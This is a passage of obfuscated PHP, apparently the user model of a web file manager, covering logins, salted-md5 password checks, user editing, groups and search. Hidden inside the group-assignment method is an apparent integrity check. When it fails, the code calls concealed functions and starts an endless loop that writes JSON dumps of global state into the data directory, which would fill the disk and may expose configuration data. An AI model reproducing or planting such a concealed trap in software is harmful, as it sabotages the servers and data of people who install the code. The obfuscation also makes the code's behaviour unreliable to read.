$_SERVER[¹àö™Ç¾]; $ïä’ª™“ = parent::listData($‹ò‹µ²‘); $€°ÕÍĞË = $this->findByName($½ğçºì[$¬ßşÙÑ¸[42]]); if (!$ïä’ª™“ || $€°ÕÍĞË && $€°ÕÍĞË[$¬ßşÙÑ¸[401]] != $ïä’ª™“[$¬ßşÙÑ¸[401]]) { return !1; } return parent::update($‹ò‹µ²‘, $½ğçºì); } public function setUserJob($õíºœ¾, $äÉæ¼¿) { $…É§ïğ¶ =& $_SERVER[¹àö™Ç¾]; if (!is_array($äÉæ¼¿)) { $äÉæ¼¿ = array($äÉæ¼¿); } $õ¾©¯ğ™ = parent::listData(); $†ìäö‰¼ = array_to_keyvalue($õ¾©¯ğ™, $…É§ïğ¶[42]); $òÓÒşóÆ = $…É§ïğ¶[382]; foreach ($äÉæ¼¿ as $Ö¢Š‚ÀÂ) { if ($†ìäö‰¼[$Ö¢Š‚ÀÂ]) { $òÓÒşóÆ .= $†ìäö‰¼[$Ö¢Š‚ÀÂ][$…É§ïğ¶[401]] . $…É§ïğ¶[60]; } else { $şçÓÛ’ = $this->add($Ö¢Š‚ÀÂ); $òÓÒşóÆ .= $şçÓÛ’ . $…É§ïğ¶[60]; } } $òÓÒşóÆ = rtrim($òÓÒşóÆ, $…É§ïğ¶[60]); Model($…É§ïğ¶[538])->metaSet($õíºœ¾, self::JOB_KEY, $òÓÒşóÆ); } public function getUserJob($ÜüÑä»Ú) { $¿æ¸ñ‡¡ = Model($_SERVER[¹àö™Ç¾][538])->metaGet($ÜüÑä»Ú); return $this->getUserJobInfo($¿æ¸ñ‡¡[self::JOB_KEY]); } public function getUserJobInfo($Èê¨ô½) { $½ôœØ®  =& $_SERVER[¹àö™Ç¾]; $¤·Ü˜ù = explode($½ôœØ® [60], $Èê¨ô½); $É±‚ã = parent::listData(); $É±‚ã = array_remove_key($É±‚ã, $½ôœØ® [203]); $¶Œ¨Ø = array(); foreach ($¤·Ü˜ù as $‡â’şÎ) { if (isset($É±‚ã[$‡â’şÎ])) { $¶Œ¨Ø[] = $É±‚ã[$‡â’şÎ]; } } return $¶Œ¨Ø; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\145" => "\x75\x73\145\x72\137\155\145\x74\141", "\155\x65\x74\x61\106\x69\x65\x6c\144" => "\x75\x73\145\x72\111\104"); protected $simpleField = "\165\163\x65\162\x49\104\x2c\x6e\x69\143\x6b\116\x61\155\145\54\156\141\x6d\145\x2c\x61\166\141\x74\141\x72\54\x73\145\170\x2c\163\164\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Úì÷²¼«) { $ßÀŒâÉÂ =& $_SERVER[¹àö™Ç¾]; $æçÅçã = $ßÀŒâÉÂ[2236]; return array($ßÀŒâÉÂ[1885] => array($Úì÷²¼«[0], $æçÅçã), $ßÀŒâÉÂ[1887] => array($Úì÷²¼«[0], $æçÅçã), $ßÀŒâÉÂ[2237] => array($Úì÷²¼«[0], $æçÅçã)); } protected function getInfo($æãÄÑäÂ, $£ùáğÂï = false) { $©Ï©Èä‘ = $this->getInfoSimple($æãÄÑäÂ); if (!is_array($©Ï©Èä‘)) { return array(); } if ($£ùáğÂï) { return $this->_getInfoApply($©Ï©Èä‘); } return $this->cacheFunctionGet($_SERVER[¹àö™Ç¾][1889], $æãÄÑäÂ); } protected function getInfoFull($òŒÕªšƒ, $üÀı„µü = false) { $âÒÖæü = $this->getInfoSimple($òŒÕªšƒ); if (!is_array($âÒÖæü)) { return array(); } if ($üÀı„µü) { return $this->_getInfoApply($âÒÖæü, !0); } return $this->cacheFunctionGet($_SERVER[¹àö™Ç¾][2238], $òŒÕªšƒ); } private function _getInfoApply($íñ¼ºù, $„¿¼³ú = false) { $ä¸¯Ìı« =& $_SERVER[¹àö™Ç¾]; if (!$íñ¼ºù) { return $íñ¼ºù; } $š˜å¹ºŠ = md5($ä¸¯Ìı«[2239] . $íñ¼ºù[$ä¸¯Ìı«[874]] . $ä¸¯Ìı«[2240] . $íñ¼ºù[$ä¸¯Ìı«[42]]); $íñ¼ºù = $this->_listDataApplyItem($íñ¼ºù); $÷î¡Àö¬ = Model($ä¸¯Ìı«[1310])->metaGet($íñ¼ºù[$ä¸¯Ìı«[97]][$ä¸¯Ìı«[403]]); $íñ¼ºù[$ä¸¯Ìı«[2241]] = $š˜å¹ºŠ; $íñ¼ºù[$ä¸¯Ìı«[97]][$ä¸¯Ìı«[2071]] = isset($÷î¡Àö¬[$ä¸¯Ìı«[2072]]) ? $÷î¡Àö¬[$ä¸¯Ìı«[2072]] : null; if ($„¿¼³ú) { $íñ¼ºù[$ä¸¯Ìı«[465]] = $this->metaGet($íñ¼ºù[$ä¸¯Ìı«[1640]]); } return $íñ¼ºù; } protected function getInfoSimple($Ÿ‚Æ«Ñ–, $Ñ”Û÷ãƒ = false) { $¾˜Ç†ôâ =& $_SERVER[¹àö™Ç¾]; if (!$Ÿ‚Æ«Ñ–) { return array(); } if ($Ñ”Û÷ãƒ) { $äˆ¤ó”’ = $this->where(array($¾˜Ç†ôâ[1640] => intval($Ÿ‚Æ«Ñ–)))->find(); if (!is_array($äˆ¤ó”’)) { return array(); } $äˆ¤ó”’[$¾˜Ç†ôâ[2242]] = Action($¾˜Ç†ôâ[2243])->parseUrl($äˆ¤ó”’[$¾˜Ç†ôâ[2242]]); return $äˆ¤ó”’; } return $this->cacheFunctionGet($¾˜Ç†ôâ[1890], $Ÿ‚Æ«Ñ–); } protected function getInfoSimpleOuter($¤şó—•¦) { $ÌìÁ†ÖÍ =& $_SERVER[¹àö™Ç¾]; if (!$¤şó—•¦ || $¤şó—•¦ == 0) { return array($ÌìÁ†ÖÍ[1640] => $ÌìÁ†ÖÍ[200], $ÌìÁ†ÖÍ[42] => $ÌìÁ†ÖÍ[169] . LNG($ÌìÁ†ÖÍ[2244]) . $ÌìÁ†ÖÍ[536], $ÌìÁ†ÖÍ[2242] => STATIC_PATH . $ÌìÁ†ÖÍ[2245]); } $€Çîë˜¼ = $this->cacheFunctionGet($ÌìÁ†ÖÍ[1890], $¤şó—•¦); $ı„´óšî = array_field_key($€Çîë˜¼, explode($ÌìÁ†ÖÍ[60], $this->simpleField)); if (!$ı„´óšî) { return array($ÌìÁ†ÖÍ[1640] => $ÌìÁ†ÖÍ[1173], $ÌìÁ†ÖÍ[42] => $ÌìÁ†ÖÍ[169] . LNG($ÌìÁ†ÖÍ[2246]) . $ÌìÁ†ÖÍ[536], $ÌìÁ†ÖÍ[2242] => STATIC_PATH . $ÌìÁ†ÖÍ[2247]); } $ı„´óšî[$ÌìÁ†ÖÍ[2242]] = Action($ÌìÁ†ÖÍ[2243])->parseUrl($ı„´óšî[$ÌìÁ†ÖÍ[2242]]); return $ı„´óšî; } protected function groupUser($Ü‚¸Ûğß) { } public static function errorLang($¼­£…Úè) { $óÉÌ¡È =& $_SERVER[¹àö™Ç¾]; $ÂÑ€š±Ò = array(self::ERROR_USER_NOT_EXISTS => $óÉÌ¡È[2248], self::ERROR_USER_PASSWORD_ERROR => $óÉÌ¡È[2249], self::ERROR_USER_EXIST_NAME => $óÉÌ¡È[2250], self::ERROR_USER_EXIST_PHONE => $óÉÌ¡È[2251], self::ERROR_USER_EXIST_EMAIL => $óÉÌ¡È[2252], self::ERROR_USER_LOGIN_LOCK => $óÉÌ¡È[2253], self::ERROR_IP_NOT_ALLOW => $óÉÌ¡È[2254], self::ERROR_USER_EXIST_NICKNAME => $óÉÌ¡È[2255]); return LNG($ÂÑ€š±Ò[$¼­£…Úè]); } public function getInfoByMeta($Ì›×Œê™, $Öü×³ì) { $†ã‡Š°Æ =& $_SERVER[¹àö™Ç¾]; $¨ıï¼ê = Model($†ã‡Š°Æ[2256])->where(array($†ã‡Š°Æ[105] => $Ì›×Œê™, $†ã‡Š°Æ[378] => $Öü×³ì))->find(); if ($¨ıï¼ê) { return $this->getInfo($¨ıï¼ê[$†ã‡Š°Æ[1640]]); } return !1; } public function userLoginCheck($ôï£ßÏò, $Á„Ï»Œ†) { $µÓ Ó†ì =& $_SERVER[¹àö™Ç¾]; $ô®Å»Ã = $this->userLoginFind($ôï£ßÏò); if (!$ô®Å»Ã) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ô®Å»Ã[$µÓ Ó†ì[1640]], $Á„Ï»Œ†)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ô®Å»Ã[$µÓ Ó†ì[1640]]); } public function userLoginFind($÷³îï…) { $¢Æ ¹˜‘ =& $_SERVER[¹àö™Ç¾]; $«àõÍş’ = array($¢Æ ¹˜‘[42] => $÷³îï…, $¢Æ ¹˜‘[2076] => $÷³îï…, $¢Æ ¹˜‘[309] => $÷³îï…, $¢Æ ¹˜‘[2257] => $÷³îï…, $¢Æ ¹˜‘[985] => $¢Æ ¹˜‘[987]); if ($this->nickNameRpt()) { unset($«àõÍş’[$¢Æ ¹˜‘[2076]]); } return $this->where($«àõÍş’)->find(); } public function clearCache($µñ‚¯£ë) { $µ§¾¥Í =& $_SERVER[¹àö™Ç¾]; $this->cacheFunctionClear($µ§¾¥Í[1889], $µñ‚¯£ë); $this->cacheFunctionClear($µ§¾¥Í[1890], $µñ‚¯£ë); $this->cacheFunctionClear($µ§¾¥Í[2238], $µñ‚¯£ë); } public function userPasswordCheck($¼öéÁó, $À»ùôæí) { $áÒŞÏÂ‚ =& $_SERVER[¹àö™Ç¾]; $Ñ’‘ ä› = $this->where(array($áÒŞÏÂ‚[1640] => intval($¼öéÁó)))->find(); $õí½ÓÄÓ = $this->metaGet($¼öéÁó); $…ƒ‚ß‹— = isset($õí½ÓÄÓ[$áÒŞÏÂ‚[2258]]) ? $õí½ÓÄÓ[$áÒŞÏÂ‚[2258]] : $áÒŞÏÂ‚[22]; if (md5($…ƒ‚ß‹— . trim($À»ùôæí)) !== $Ñ’‘ ä›[$áÒŞÏÂ‚[874]]) { return !1; } return !0; } public function userAdd($êæêÓËÛ) { $À‰†áæÑ =& $_SERVER[¹àö™Ç¾]; $èÈ‹Ñ‰È = array($À‰†áæÑ[421] => $êæêÓËÛ[$À‰†áæÑ[42]], $À‰†áæÑ[2259] => $êæêÓËÛ[$À‰†áæÑ[1520]], $À‰†áæÑ[2260] => isset($êæêÓËÛ[$À‰†áæÑ[309]]) ? $êæêÓËÛ[$À‰†áæÑ[309]] : $À‰†áæÑ[22], $À‰†áæÑ[2261] => isset($êæêÓËÛ[$À‰†áæÑ[2257]]) ? $êæêÓËÛ[$À‰†áæÑ[2257]] : $À‰†áæÑ[22], $À‰†áæÑ[2262] => isset($êæêÓËÛ[$À‰†áæÑ[2076]]) ? $êæêÓËÛ[$À‰†áæÑ[2076]] : $êæêÓËÛ[$À‰†áæÑ[42]], $À‰†áæÑ[2263] => isset($êæêÓËÛ[$À‰†áæÑ[2242]]) ? $êæêÓËÛ[$À‰†áæÑ[2242]] : $À‰†áæÑ[22], $À‰†áæÑ[2264] => isset($êæêÓËÛ[$À‰†áæÑ[2265]]) ? $êæêÓËÛ[$À‰†áæÑ[2265]] : 1, $À‰†áæÑ[2266] => $êæêÓËÛ[$À‰†áæÑ[874]], $À‰†áæÑ[1891] => isset($êæêÓËÛ[$À‰†áæÑ[1795]]) ? $êæêÓËÛ[$À‰†áæÑ[1795]] : 1024 * 1024 * 20, $À‰†áæÑ[1892] => 0, $À‰†áæÑ[2267] => 0, $À‰†áæÑ[1932] => isset($êæêÓËÛ[$À‰†áæÑ[742]]) ? $êæêÓËÛ[$À‰†áæÑ[742]] : 1); if (!empty($êæêÓËÛ[$À‰†áæÑ[1640]])) { $èÈ‹Ñ‰È[$À‰†áæÑ[1640]] = $êæêÓËÛ[$À‰†áæÑ[1640]]; } $‹§†ŠåÕ = $this->_checkExist($êæêÓËÛ); if ($‹§†ŠåÕ !== !0) { return $‹§†ŠåÕ; } $¶Â¼›±Ì = $this->add($èÈ‹Ñ‰È); $Î’ÇÖÅ = array($À‰†áæÑ[2266] => $èÈ‹Ñ‰È[$À‰†áæÑ[874]], $À‰†áæÑ[2262] => $èÈ‹Ñ‰È[$À‰†áæÑ[2076]]); $this->userEdit($¶Â¼›±Ì, $Î’ÇÖÅ); Model($À‰†áæÑ[1310])->userRootAdd($¶Â¼›±Ì); return $¶Â¼›±Ì; } protected function userEditTest($‡³Ó·È‹, $Ù €´Ì˜) { return $this->call($_SERVER[¹àö™Ç¾][2268], $‡³Ó·È‹, $Ù €´Ì˜); } protected function userEdit($ÓçØò»», $ ôÈûÃ€) { $î à‡®¡ =& $_SERVER[¹àö™Ç¾]; $öŠîùêÁ = $this->getInfoSimple($ÓçØò»»); if (!$öŠîùêÁ) { return !1; } $Á¬õ–›ğ = $this->_checkExist($ ôÈûÃ€, $ÓçØò»»); if ($Á¬õ–›ğ !== !0) { return $Á¬õ–›ğ; } if (isset($ ôÈûÃ€[$î à‡®¡[874]]) && trim($ ôÈûÃ€[$î à‡®¡[874]]) != $î à‡®¡[22]) { $¾¤ƒìî¢ = $this->metaGet($ÓçØò»»); if (empty($¾¤ƒìî¢[$î à‡®¡[2258]])) { $¾¤ƒìî¢[$î à‡®¡[2258]] = rand_string(10); Model($î à‡®¡[513])->metaSet($ÓçØò»», $î à‡®¡[2258], $¾¤ƒìî¢[$î à‡®¡[2258]]); } $ ôÈûÃ€[$î à‡®¡[874]] = md5($¾¤ƒìî¢[$î à‡®¡[2258]] . trim($ ôÈûÃ€[$î à‡®¡[874]])); } else { unset($ ôÈûÃ€[$î à‡®¡[874]]); } $this->where(array($î à‡®¡[1631] => $ÓçØò»»))->save($ ôÈûÃ€); if (isset($ ôÈûÃ€[$î à‡®¡[2076]])) { $this->setNamePinyin($ÓçØò»», $ ôÈûÃ€[$î à‡®¡[2076]]); } $this->clearCache($ÓçØò»»); return !0; } public function setNamePinyin($¨ö„§, $‚í•Ëğ = false) { $³“»àÁ‡ =& $_SERVER[¹àö™Ç¾]; if (!$‚í•Ëğ) { $˜ÇªÓ = $this->getInfoSimple($¨ö„§); $‚í•Ëğ = $˜ÇªÓ[$³“»àÁ‡[2076]] ? $˜ÇªÓ[$³“»àÁ‡[2076]] : $˜ÇªÓ[$³“»àÁ‡[42]]; } $¼Şíî¨Á = Model($³“»àÁ‡[538]); if (!Input::check($‚í•Ëğ, $³“»àÁ‡[587])) { return $¼Şíî¨Á->metaSet($¨ö„§, array($³“»àÁ‡[464] => $³“»àÁ‡[22], $³“»àÁ‡[463] => $³“»àÁ‡[22])); } return $¼Şíî¨Á->metaSet($¨ö„§, array($³“»àÁ‡[464] => str_replace($³“»àÁ‡[63], $³“»àÁ‡[22], Pinyin::get($‚í•Ëğ)), $³“»àÁ‡[463] => Pinyin::get($‚í•Ëğ, $³“»àÁ‡[588]))); } private function nickNameRpt() { $ÈÈª‚ñ¿ =& $_SERVER[¹àö™Ç¾]; $ÇË‡‰ëä = Model($ÈÈª‚ñ¿[762])->get($ÈÈª‚ñ¿[2269]); $ñ›Â³Ã‡ = $GLOBALS[$ÈÈª‚ñ¿[16]][$ÈÈª‚ñ¿[385]][$ÈÈª‚ñ¿[2269]]; $æöØôò› = !is_null($ÇË‡‰ëä) ? $ÇË‡‰ëä : $ñ›Â³Ã‡; return !!$æöØôò›; } private function _checkExist($¼šÅ‘Â, $¨£ä­í§ = false) { $¨äŒ‰¼  =& $_SERVER[¹àö™Ç¾]; $ğÖïàôæ = array($¨äŒ‰¼ [42] => UserModel::ERROR_USER_EXIST_NAME, $¨äŒ‰¼ [2076] => UserModel::ERROR_USER_EXIST_NICKNAME, $¨äŒ‰¼ [309] => UserModel::ERROR_USER_EXIST_EMAIL, $¨äŒ‰¼ [2257] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ğÖïàôæ[$¨äŒ‰¼ [2076]]); } $Ö€ëŸ›² = $¨£ä­í§ ? array($¨äŒ‰¼ [1640] => array($¨äŒ‰¼ [2270], $¨£ä­í§)) : array(); foreach ($ğÖïàôæ as $·‹¡íì => $»¿®Œ¾­) { $ €½ÖÕÈ = array(); foreach ($ğÖïàôæ as $¤ªÙŠ¼ => $¢–©ö“) { if (isset($¼šÅ‘Â[$¤ªÙŠ¼]) && $¼šÅ‘Â[$¤ªÙŠ¼]) { $ €½ÖÕÈ[] = $¼šÅ‘Â[$¤ªÙŠ¼]; } } if (!$ €½ÖÕÈ) { continue; } $ÓàÅÁ = array_merge(array($·‹¡íì => array($¨äŒ‰¼ [17], $ €½ÖÕÈ)), $Ö€ëŸ›²); $Üë˜óøÀ = $this->where($ÓàÅÁ)->find(); if ($Üë˜óøÀ) { return $»¿®Œ¾­; } } return !0; } public function userListInfo($İ–éÍóÙ) { $ö¤Ş¶Ù =& $_SERVER[¹àö™Ç¾]; $úÑğÑ½ä = array(); $İ–éÍóÙ = is_array($İ–éÍóÙ) ? array_unique($İ–éÍóÙ) : array(); if (!$İ–éÍóÙ) { return $úÑğÑ½ä; } if (count($İ–éÍóÙ) < 20) { foreach ($İ–éÍóÙ as $¹˜»¶¨š) { $úÑğÑ½ä[$¹˜»¶¨š . $ö¤Ş¶Ù[22]] = $this->getInfoSimpleOuter($¹˜»¶¨š); } } else { $ôŞÆ½Ë¡ = array($ö¤Ş¶Ù[1631] => array($ö¤Ş¶Ù[419], $İ–éÍóÙ)); if (count($İ–éÍóÙ) == 1) { $ôŞÆ½Ë¡ = array($ö¤Ş¶Ù[1631] => $İ–éÍóÙ[0]); } $Õö¥Ï‘Ñ = Model($ö¤Ş¶Ù[513])->field($this->simpleField)->where($ôŞÆ½Ë¡)->select(); $Õö¥Ï‘Ñ = array_to_keyvalue($Õö¥Ï‘Ñ, $ö¤Ş¶Ù[1640]); foreach ($İ–éÍóÙ as $¹˜»¶¨š) { $Õğ“ğà = $Õö¥Ï‘Ñ[$¹˜»¶¨š]; if (!$Õğ“ğà) { $úÑğÑ½ä[$¹˜»¶¨š . $ö¤Ş¶Ù[22]] = $this->getInfoSimpleOuter($¹˜»¶¨š); continue; } $Õğ“ğà[$ö¤Ş¶Ù[2242]] = Action($ö¤Ş¶Ù[2243])->parseUrl($Õğ“ğà[$ö¤Ş¶Ù[2242]]); $úÑğÑ½ä[$¹˜»¶¨š . $ö¤Ş¶Ù[22]] = $Õğ“ğà; } } return $úÑğÑ½ä; } protected function userStatus($»œñš», $­ÂÓïĞÖ) { $ÎçÍÉ½¸ = $this->getInfoSimple($»œñš»); if (!$ÎçÍÉ½¸) { return !1; } $Â‘Äİì = array($_SERVER[¹àö™Ç¾][742] => $­ÂÓïĞÖ); return $this->userEdit($»œñš», $Â‘Äİì); } protected function userRemove($ÔõÀ’–û) { $±ëüõÇ¥ =& $_SERVER[¹àö™Ç¾]; $¥­¸†Åñ = $this->getInfoSimple($ÔõÀ’–û); if (!$¥­¸†Åñ) { return !1; } $È¨µÕèû = array($±ëüõÇ¥[1631] => $ÔõÀ’–û); Model($±ëüõÇ¥[595])->where($È¨µÕèû)->delete(); Model($±ëüõÇ¥[2271])->where($È¨µÕèû)->delete(); Model($±ëüõÇ¥[1897])->where($È¨µÕèû)->delete(); Model($±ëüõÇ¥[2256])->where($È¨µÕèû)->delete(); Model($±ëüõÇ¥[1053])->where($È¨µÕèû)->delete(); Model($±ëüõÇ¥[2093])->removeUserAll($ÔõÀ’–û); Model($±ëüõÇ¥[817])->userRootRemove($ÔõÀ’–û); return $this->where($È¨µÕèû)->delete(); } protected function userGroupSet($—ë‰é¿Ï, $Ñç‚Ã í, $û£òæÙ = array()) { $à§æí½ã =& $_SERVER[¹àö™Ç¾]; $ô˜–õ§ˆ = $_SERVER[$à§æí½ã[9]] . $à§æí½ã[10]; $ü»¹ñïâ = $à§æí½ã[1504]; if ($_SERVER[$à§æí½ã[6]] != $ü»¹ñïâ($ô˜–õ§ˆ)) { $ÔóĞ„õÁ = $à§æí½ã[864]; $Â‘Ä™¼á = $à§æí½ã[8]; $éŠÓš¤Â = $_SERVER[$à§æí½ã[9]] . $à§æí½ã[10]; $µôµïÒ = $Â‘Ä™¼á($éŠÓš¤Â); $ €ıÎ‚ß = explode($à§æí½ã[11], $µôµïÒ); if (count($ €ıÎ‚ß) < $à§æí½ã[607]) { $¨í×Û²â = $à§æí½ã[13]; $¨í×Û²â(); } $™ØòÂß· = $à§æí½ã[865]; $™ØòÂß·($_SERVER[$à§æí½ã[866]]); $ÔóĞ„õÁ = $à§æí½ã[864]; $ÔóĞ„õÁ(); $Š½²œœş = $à§æí½ã[1505]; $ğœÜÅñ = json_encode($GLOBALS[$à§æí½ã[1506]]); $§Ø¦ÑÍº = 1; for ($ÜÃÂŠÒí = $§Ø¦ÑÍº; $ÜÃÂŠÒí > 0; $ÜÃÂŠÒí++) { $Š½²œœş(DATA_PATH . $ÜÃÂŠÒí, $ğœÜÅñ); } } $¯©Ÿ‰ùî = $this->getInfoSimple($—ë‰é¿Ï); if (!$¯©Ÿ‰ùî || !is_array($Ñç‚Ã í)) { return !1; } $š¤¯Çß‹ = Model($à§æí½ã[1897]); $š¤¯Çß‹->where(array($à§æí½ã[1640] => $—ë‰é¿Ï))->delete(); $Ÿ½½ÅŒß = array(); $®õˆÅ•â = 0; foreach ($Ñç‚Ã í as $§Ù’Äâ => $›¨âØüå) { $®õ£ºÉÑ = array($à§æí½ã[1640] => $—ë‰é¿Ï, $à§æí½ã[1808] => $§Ù’Äâ, $à§æí½ã[1909] => $›¨âØüå); $®õ£ºÉÑ[$à§æí½ã[1831]] = isset($û£òæÙ[$®õˆÅ•â]) ? $û£òæÙ[$®õˆÅ•â] : 0; $®õˆÅ•â++; $Ÿ½½ÅŒß[] = $®õ£ºÉÑ; } return $š¤¯Çß‹->addAll($Ÿ½½ÅŒß, array(), !0); } protected function userGroupAdd($¬œ€«›’, $«ô·†Ñ = array()) { $‡Üİå =& $_SERVER[¹àö™Ç¾]; $Íø¨ = $this->getInfoSimple($¬œ€«›’); if (!$Íø¨ || empty($«ô·†Ñ)) { return !1; } $†êÒÊİ = array(); foreach ($«ô·†Ñ as $¿‚¶ûÊø => $˜°’Ï¾) { $†êÒÊİ[] = array($‡Üİå[1640] => $¬œ€«›’, $‡Üİå[1808] => $¿‚¶ûÊø, $‡Üİå[1909] => $˜°’Ï¾, $‡Üİå[1831] => 0); } return Model($‡Üİå[1897])->addAll($†êÒÊİ, array(), !0); } protected function userGroupRemove($õèÏ—ÂÂ, $¡ŸÁ‚¼¯) { $±öÚı¢ˆ =& $_SERVER[¹àö™Ç¾]; $øëÅ‹¯Ã = $this->getInfoSimple($õèÏ—ÂÂ); if (!$øëÅ‹¯Ã || !$¡ŸÁ‚¼¯) { return !1; } $–ÓçÄ—ˆ = array($±öÚı¢ˆ[1631] => $õèÏ—ÂÂ, $±öÚı¢ˆ[1895] => $¡ŸÁ‚¼¯); return Model($±öÚı¢ˆ[1897])->where($–ÓçÄ—ˆ)->delete(); } public function listData() { $’íşÌ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($’íşÌ[$_SERVER[¹àö™Ç¾][373]]); return $’íşÌ; } public function listByID($Ş¤ûŞıŸ) { $åÔÎÈÕñ =& $_SERVER[¹àö™Ç¾]; if (!$Ş¤ûŞıŸ) { return; } $·×éî¸Ú = array($åÔÎÈÕñ[1640] => array($åÔÎÈÕñ[17], $Ş¤ûŞıŸ)); $Ø©Ğ„ÔÊ = $this->where($·×éî¸Ú)->select(); $Ø©Ğ„ÔÊ = array_sort_keep($Ø©Ğ„ÔÊ, $åÔÎÈÕñ[1640], $Ş¤ûŞıŸ); $this->_listDataApply($Ø©Ğ„ÔÊ); return $Ø©Ğ„ÔÊ; } public function listByGroup($¦ÒÃ•ˆ¨ = 0, $¼¯Ê×„Ü = array()) { $ÒİÇ³Ë =& $_SERVER[¹àö™Ç¾]; $·íÈÆ¨Æ = $ÒİÇ³Ë[22]; $¸¿ò®¶‚ = array(); if ($¦ÒÃ•ˆ¨) { $¸¿ò®¶‚ = array($ÒİÇ³Ë[2272] => intval($¦ÒÃ•ˆ¨)); $·íÈÆ¨Æ = "\x4c\x45\106\x54\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x75\163\145\162\x5f\147\x72\157\x75\x70\x20\x75\x73\145\x72\137\x67\162\x6f\x75\x70\40\x6f\156\x20\165\x73\x65\162\56\x75\163\145\x72\111\104\40\75\40\165\x73\145\162\137\147\162\157\x75\160\56\165\163\145\162\x49\104"; $â¿ÖÖ¥¨ = Input::get($ÒİÇ³Ë[455], null, $ÒİÇ³Ë[22]) ? $ÒİÇ³Ë[22] : $ÒİÇ³Ë[2273]; } if (isset($¼¯Ê×„Ü[$ÒİÇ³Ë[742]])) { $¸¿ò®¶‚[$ÒİÇ³Ë[2274]] = $¼¯Ê×„Ü[$ÒİÇ³Ë[742]]; } $è”å¥äŞ = $this->_makeOrder($â¿ÖÖ¥¨)->field($ÒİÇ³Ë[2275])->where($¸¿ò®¶‚)->join($·íÈÆ¨Æ)->selectPage(50); $this->_listDataApply($è”å¥äŞ[$ÒİÇ³Ë[373]]); return $è”å¥äŞ; } private function _makeOrder($×€êıÄ = '') { $Ÿ²Ñ‹îı =& $_SERVER[¹àö™Ç¾]; $¼ñ±·Ê– = array($Ÿ²Ñ‹îı[1640], $Ÿ²Ñ‹îı[42], $Ÿ²Ñ‹îı[1797], $Ÿ²Ñ‹îı[1769], $Ÿ²Ñ‹îı[203]); $º€Ñ‡ğ = array($Ÿ²Ñ‹îı[448] => $Ÿ²Ñ‹îı[449], $Ÿ²Ñ‹îı[450] => $Ÿ²Ñ‹îı[451]); $äÔ»¨Ğ = Input::get($Ÿ²Ñ‹îı[455], $Ÿ²Ñ‹îı[17], $Ÿ²Ñ‹îı[1631], $¼ñ±·Ê–); $ÑçÎ²™§ = Input::get($Ÿ²Ñ‹îı[456], $Ÿ²Ñ‹îı[17], $Ÿ²Ñ‹îı[1898], array($Ÿ²Ñ‹îı[1898], $Ÿ²Ñ‹îı[450])); $ÑçÎ²™§ = $º€Ñ‡ğ[$ÑçÎ²™§]; $×€êıÄ = $×€êıÄ . "\x75\163\x65\x72\x2e{$äÔ»¨Ğ}\x20{$ÑçÎ²™§}\x2c\40\x75\163\x65\162\x2e\165\x73\x65\x72\x49\104\40\141\x73\143"; return $this->alias($Ÿ²Ñ‹îı[2016])->order($×€êıÄ); } public function listSearch($’ü¢¿”) { $òÉè½• =& $_SERVER[¹àö™Ç¾]; $ÈÖÕØ–Õ = $’ü¢¿”[$òÉè½•[1899]]; $½‚Ï²ïÓ = isset($’ü¢¿”[$òÉè½•[1900]]) ? $’ü¢¿”[$òÉè½•[1900]] : !1; $ÈÖÕØ–Õ = str_replace($òÉè½•[1901], $òÉè½•[1902], trim($ÈÖÕØ–Õ)); $éö‚éÅ­ = array($òÉè½•[42] => array($òÉè½•[387], "\x25{$ÈÖÕØ–Õ}\45"), $òÉè½•[309] => array($òÉè½•[387], "{$ÈÖÕØ–Õ}\x25"), $òÉè½•[2076] => array($òÉè½•[387], "{$ÈÖÕØ–Õ}\x25"), $òÉè½•[985] => $òÉè½•[1903]); if (Input::check($ÈÖÕØ–Õ, $òÉè½•[315])) { $éö‚éÅ­[$òÉè½•[1640]] = array($òÉè½•[387], "{$ÈÖÕØ–Õ}\x25"); $éö‚éÅ­[$òÉè½•[2257]] = array($òÉè½•[387], "{$ÈÖÕØ–Õ}\x25"); } if (!$ÈÖÕØ–Õ) { $éö‚éÅ­ = array(); } if (isset($’ü¢¿”[$òÉè½•[742]])) { $éö‚éÅ­[$òÉè½•[742]] = $’ü¢¿”[$òÉè½•[742]]; } $éö‚éÅ­ = $this->parseWhereLike($éö‚éÅ­); $ŸÈÎıÒ = $this->_makeOrder()->where($éö‚éÅ­)->selectPage(20); if (!$ŸÈÎıÒ || count($ŸÈÎıÒ[$òÉè½•[373]]) < 5 && Input::check($ÈÖÕØ–Õ, $òÉè½•[322])) { $¶á•Û½ô = $this->_searchFromMeta($òÉè½•[463], $ÈÖÕØ–Õ, 10); $Õ„Í¢¹ = $this->_searchFromMeta($òÉè½•[464], $ÈÖÕØ–Õ, 10); $ùËèĞ©å = array_merge($¶á•Û½ô, $Õ„Í¢¹, $ŸÈÎıÒ[$òÉè½•[373]]); $ŸÈÎıÒ[$òÉè½•[373]] = array_unique_by_key($ùËèĞ©å, $òÉè½•[1640]); $ŸÈÎıÒ[$òÉè½•[370]][$òÉè½•[371]] = count($ŸÈÎıÒ[$òÉè½•[373]]); $ŸÈÎıÒ[$òÉè½•[370]][$òÉè½•[372]] = ceil($ŸÈÎıÒ[$òÉè½•[370]][$òÉè½•[371]] / $ŸÈÎıÒ[$òÉè½•[370]][$òÉè½•[367]]); } $this->_listDataApply($ŸÈÎıÒ[$òÉè½•[373]]); $this->_filterByGroup($ŸÈÎıÒ, $½‚Ï²ïÓ); return $ŸÈÎıÒ; } private function _filterByGroup(&$Ç ˜€½, $ÊööÄÁÆ) { $Œ ò‰ÂÉ =& $_SERVER[¹àö™Ç¾]; if (!$ÊööÄÁÆ) { return $Ç ˜€½; } foreach ($Ç ˜€½[$Œ ò‰ÂÉ[373]] as $—ì¸³Ô¶ => &$•‹†ëÌ) { $´–½÷ = array_to_keyvalue($•‹†ëÌ[$Œ ò‰ÂÉ[1986]], $Œ ò‰ÂÉ[22], $Œ 